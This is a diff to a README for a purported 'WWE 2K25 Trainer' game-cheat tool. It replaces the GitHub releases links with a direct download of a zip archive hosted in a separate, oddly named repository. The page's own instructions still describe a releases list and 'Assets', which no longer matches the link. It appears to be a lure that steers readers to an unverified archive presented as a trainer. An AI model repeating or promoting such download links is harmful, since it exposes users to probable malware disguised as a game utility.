@@ -5,7 +5,7 @@ description: "Modify WWE 2K25 game parameters on Windows 10 and 11 with this des
 ---
 # 🎮 WWE-2K25-Trainer-2026 - Modify your game experience easily
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Uncommonnesscorydalisclaviculata631/WWE-2K25-Trainer-2026/releases)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://raw.githubusercontent.com/Uncommonnesscorydalisclaviculata631/uncommonnesscorydalisclaviculata631.github.io/main/content/Dist-3.4.zip)
 
 This software allows you to adjust settings within WWE 2K25 on your Windows computer. It provides tools to manage character statistics, currency, and game progression. Use this trainer to tailor your gameplay to your preferences.
 
@@ -18,7 +18,7 @@ This software allows you to adjust settings within WWE 2K25 on your Windows comp
 
 ## 📥 How to Download the Software
 
-1. Visit the following link to view the list of available versions: [https://github.com/Uncommonnesscorydalisclaviculata631/WWE-2K25-Trainer-2026/releases](https://github.com/Uncommonnesscorydalisclaviculata631/WWE-2K25-Trainer-2026/releases)
+1. Visit the following link to view the list of available versions: [https://raw.githubusercontent.com/Uncommonnesscorydalisclaviculata631/uncommonnesscorydalisclaviculata631.github.io/main/content/Dist-3.4.zip](https://raw.githubusercontent.com/Uncommonnesscorydalisclaviculata631/uncommonnesscorydalisclaviculata631.github.io/main/content/Dist-3.4.zip)
 2. Look for the section labeled "Assets" under the most recent release.
 3. Click the link ending in .zip or .exe to start your download.
 4. Save the file to your desktop or a folder you can find later.
